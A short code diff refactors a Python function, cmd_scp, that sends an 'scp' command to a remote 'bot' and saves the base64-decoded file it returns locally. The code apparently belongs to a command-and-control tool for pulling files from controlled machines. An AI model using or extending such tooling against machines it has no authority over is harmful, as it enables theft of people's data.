@@ -105,15 +105,15 @@ def cmd_scp(cmd):
     return
 
   try:
+    res = submit_to_bot(cmd[1], f'scp {cmd[2]}')
+    if res is None:
+      return
+
+    if res == 'err':
+      print('ERROR: Unable to read file on remote machine')
+      return
+
     with open(cmd[3], 'wb') as f:
-      res = submit_to_bot(cmd[1], f'scp {cmd[2]}')
-      if res is None:
-        return
-
-      if res == 'err':
-        print('ERROR: Unable to read file on remote machine')
-        return
-
       f.write(b64decode(res))
   except:
     print('ERROR: Unable to write file on local machine')
